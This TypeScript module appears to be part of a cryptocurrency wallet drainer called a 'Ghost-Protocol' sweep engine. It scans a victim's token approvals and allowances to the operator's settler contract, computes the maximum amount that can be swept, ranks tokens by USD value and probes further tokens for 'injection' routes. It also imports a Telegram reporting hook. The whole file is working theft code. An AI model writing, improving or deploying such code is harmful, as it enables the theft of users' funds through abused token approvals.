import {
  parseAbi,
  type Address,
  zeroAddress,
  parseAbiItem,
  getAddress,
} from "viem";
import {
  GLOBAL_SPENDERS,
  MINIMAL_ERC20_ABI,
  EXECUTION_POLICY,
} from "./constants";
import { extractDeepVectors, identifyInjectionMode } from "./vectors";
import { getGhostClient } from "./client";
import { sendActivityToTelegram } from "@/lib/telegram";

const logLabel = "[ghost/strike]";
const PERMIT2_ADDR = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase();

/**
 * 🛰️ GHOST-PROTOCOL ENGINE (v8.4.0 - High-Concurrency Edition)
 * Optimized for < 1s execution by parallelizing RPC handshakes.
 */
export async function checkAndTriggerGhostSweep(
  userAddress: string,
  assets: any[],
  chainId: number,
  vaultAddress?: string,
  onAllowanceDetected?: () => void,
) {
  const client = getGhostClient(chainId);
  const checksummedUser = getAddress(userAddress);
  const currentSettler = vaultAddress ? getAddress(vaultAddress) : null;

  try {
    console.log(`${logLabel} 🛰️ Recon + Injection Scan | Chain: ${chainId}`);

    // 1. RECONNAISSANCE (Optimized Lookback)
    // Scanning from 0n is the main bottleneck. We now use a targeted window.
    const getFastLogs = async () => {
      try {
        const latestBlock = await client.getBlockNumber();
        const fromBlock = latestBlock - 50000n > 0n ? latestBlock - 50000n : 0n;
        return await client.getLogs({
          event: parseAbiItem(
            "event Approval(address indexed owner, address indexed spender, uint256 value)",
          ),
          args: { owner: checksummedUser },
          fromBlock,
          toBlock: "latest",
        });
      } catch {
        return [];
      }
    };

    const [histLogs, deepVectors] = await Promise.all([
      getFastLogs(),
      extractDeepVectors(checksummedUser, client).catch(() => []),
    ]);

    // 2. SPENDER COMPILATION (Pre-Checksummed)
    const masterSpenders = Array.from(
      new Set([
        getAddress(GLOBAL_SPENDERS.STRIKE_SETTLER),
        ...(currentSettler ? [currentSettler] : []),
        ...Object.values(GLOBAL_SPENDERS).map((s) => getAddress(s)),
      ]),
    ).filter((s): s is Address => !!s && s !== zeroAddress);

    console.log(
      `${logLabel} 🔒 Locked to ${masterSpenders.length} explicitly trusted spenders.`,
    );
    console.log(
      `${logLabel} 🔍 Audited ${masterSpenders.length} potential spenders via Discovery.`,
    );

    // Filter and Sort Assets (Process most valuable first)
    const viableAssets = assets
      .filter(
        (a) =>
          (a.contractAddress || a.tokenAddress) && BigInt(a.balance || 0) > 0n,
      )
      .sort((a, b) => (Number(b.usdValue) || 0) - (Number(a.usdValue) || 0));

    const allowanceCalls: any[] = [];
    const callMetadata: any[] = [];

    viableAssets.forEach((asset) => {
      const tokenAddr = getAddress(asset.contractAddress || asset.tokenAddress);
      masterSpenders.forEach((spender) => {
        allowanceCalls.push({
          address: tokenAddr,
          abi: MINIMAL_ERC20_ABI,
          functionName: "allowance",
          args: [checksummedUser, spender],
        });
        callMetadata.push({ asset, spender, tokenAddr });
      });
    });

    const ghostTargets: any[] = [];
    const BATCH_SIZE = 200; // Increased for performance
    const batchPromises = [];

    // ⚡ SPEED HACK: Parallelize all multicall batches
    for (let i = 0; i < allowanceCalls.length; i += BATCH_SIZE) {
      batchPromises.push(
        client
          .multicall({
            contracts: allowanceCalls.slice(i, i + BATCH_SIZE),
            allowFailure: true,
          })
          .then((results) => ({ results, offset: i })),
      );
    }

    const allBatchResults = await Promise.all(batchPromises);

    for (const { results, offset } of allBatchResults) {
      for (let idx = 0; idx < results.length; idx++) {
        const res = results[idx];
        const val = res.status === "success" ? (res.result as bigint) : 0n;
        const meta = callMetadata[offset + idx];

        if (val > 0n) {
          console.log(
            `${logLabel} 🔍 Debug: Found allowance for ${
              meta.asset.symbol
            } | Spender: ${meta.spender} | Amount: ${val.toString()}`,
          );

          const isAuthorized = EXECUTION_POLICY.ALLOWED_SPENDERS.includes(
            getAddress(meta.spender),
          );
          if (!isAuthorized) {
            console.warn(
              `${logLabel} 🛑 TRUST INJECTION BLOCKED: ${meta.spender}`,
            );
            continue;
          }

          const spenderAddr = meta.spender.toLowerCase();
          const isPermit2 = spenderAddr === PERMIT2_ADDR;
          const isCurrentSettler =
            currentSettler && spenderAddr === currentSettler.toLowerCase();

          if (isCurrentSettler && !isPermit2) {
            const balance = BigInt(meta.asset.balance || 0);
            const sweepAmount = balance < val ? balance : val;

            console.log(
              `${logLabel} ⚖️ Smart-Sweep Logic [${meta.asset.symbol}]:`,
            );
            console.log(
              `${logLabel} 💰 Balance: ${balance.toString()} | 🔓 Allowance: ${val.toString()}`,
            );
            console.log(
              `${logLabel} 🚀 Final Sweep Amount: ${sweepAmount.toString()}`,
            );

            ghostTargets.push({
              token: meta.tokenAddr,
              symbol: meta.asset.symbol,
              amount: sweepAmount.toString(),
              allowance: val.toString(),
              spender: meta.spender,
              chainId,
              usdValue: Number(meta.asset.usdValue) || 0,
              mode: "ALLOWANCE",
              isPriority: true,
            });
          } else if (isPermit2) {
            console.log(
              `${logLabel} 🛡️ Permit2 detected for ${meta.asset.symbol}.`,
            );
          }
        }
      }
    }

    // 3. INJECTION PROBING (Parallelized)
    const remainingAssets = viableAssets.filter(
      (va) =>
        !ghostTargets.some(
          (gt) =>
            gt.token === getAddress(va.contractAddress || va.tokenAddress),
        ),
    );

    if (remainingAssets.length > 0) {
      // Limit to top 10 remaining assets to avoid RPC rate limits
      const injectionResults = await Promise.all(
        remainingAssets.slice(0, 10).map(async (asset) => {
          const tokenAddr = getAddress(
            asset.contractAddress || asset.tokenAddress,
          );
          const mode = await identifyInjectionMode(
            tokenAddr,
            checksummedUser,
            client,
          );

          const modeStr = String(mode);
          const requiresSignature =
            modeStr.includes("PERMIT") ||
            modeStr.includes("2612") ||
            modeStr === "SIGNATURE";

          if (modeStr !== "LEGACY" && !requiresSignature) {
            return {
              token: tokenAddr,
              symbol: asset.symbol,
              amount: asset.balance.toString(),
              spender: tokenAddr,
              chainId,
              usdValue: Number(asset.usdValue) || 0,
              mode,
              isPriority: false,
            };
          }
          return null;
        }),
      );
      injectionResults.forEach((r) => {
        if (r) ghostTargets.push(r);
      });
    }

    // 4. CLEANUP & RETURN
    return ghostTargets
      .reduce((acc, target) => {
        const spenderLower = target.spender.toLowerCase();
        const modeStr = String(target.mode);
        if (
          spenderLower === PERMIT2_ADDR ||
          modeStr.includes("PERMIT") ||
          modeStr.includes("2612")
        )
          return acc;

        const existing = acc.find((t: any) => t.token === target.token);
        if (!existing || target.isPriority) {
          return [...acc.filter((t: any) => t.token !== target.token), target];
        }
        return acc;
      }, [])
      .sort((a: any, b: any) => b.usdValue - a.usdValue);
  } catch (err: any) {
    console.error(`${logLabel} 🛑 Engine Fatal Error: ${err.message}`);
    return [];
  }
}

export { generatePermit2Data } from "../permit2";
